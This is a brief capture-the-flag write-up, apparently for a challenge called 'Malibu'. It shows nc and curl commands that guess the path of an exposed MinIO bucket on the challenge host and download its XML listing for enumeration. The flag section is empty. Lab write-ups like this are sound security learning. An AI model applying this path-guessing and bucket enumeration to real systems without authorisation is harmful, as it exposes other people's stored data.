# Malibu

## Steps
```bash
# spin up instance and connect
nc -vvv challenge.ctf.games 30606

# smack keys and enter a number of times, see it returns HTTP output, using minio

# key was 'what do you take to the beach' ... trying many things like
# GET /beach HTTP/1.1
# GET /sunscreen HTTP/1.1
# GET /suncream HTTP/1.1 - not sure if murican lol
# GET /bucket HTTP/1.1 << jackpot

# it returns some xml, so run it via curl to check again
curl -k -v http://challenge.ctf.games:30606/bucket

# dump xml to a file
curl -k http://challenge.ctf.games:30606/bucket -o bucket_curl.xml

# okay so it lists the contents of the bucket, python script to enumerate over keys
python enumerate.py
```

## Output
### Initial nc
```
Connection to challenge.ctf.games (35.193.148.143) 30606 port [tcp/*] succeeded!
GET /bucket HTTP/1.1
Host: localhost

HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 41626
Content-Type: application/xml
Server: MinIO
Strict-Transport-Security: max-age=31536000; includeSubDomains
Vary: Origin
Vary: Accept-Encoding
X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
X-Amz-Request-Id: 17FBA4F09B2E93FC
X-Content-Type-Options: nosniff
X-Ratelimit-Limit: 59
X-Ratelimit-Remaining: 59
X-Xss-Protection: 1; mode=block
Date: Sat, 05 Oct 2024 19:23:56 GMT

<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>bucket<
...
```

## Flag
```

```